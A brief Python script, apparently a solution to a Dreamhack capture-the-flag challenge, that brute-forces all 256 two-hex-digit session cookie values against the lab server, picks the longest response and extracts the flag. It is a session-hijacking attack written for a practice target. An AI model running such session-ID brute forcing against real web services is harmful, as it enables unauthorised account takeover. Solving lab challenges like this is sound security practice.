import requests
url="http://host3.dreamhack.games:9090/"
result={}

for i in range(256):
    key = f"{i:02x}"
    resp= requests.get(url, cookies={'sessionid':key})
    result[key]=len(resp.text)
    print(f"{key}:{len(resp.text)}")

maxlen=max(result.values())
maxkey= [index for index,value in result.items() if value== maxlen]
print(maxkey,maxlen)

response= requests.get(url,cookies={'sessionid':maxkey[0]})
flag_start= response.text.find("DH{")
flag_end=response.text.find("}",flag_start)
find_flag=response.text
print(f"Find Flag[+]:{find_flag[flag_start:flag_end+1]}")
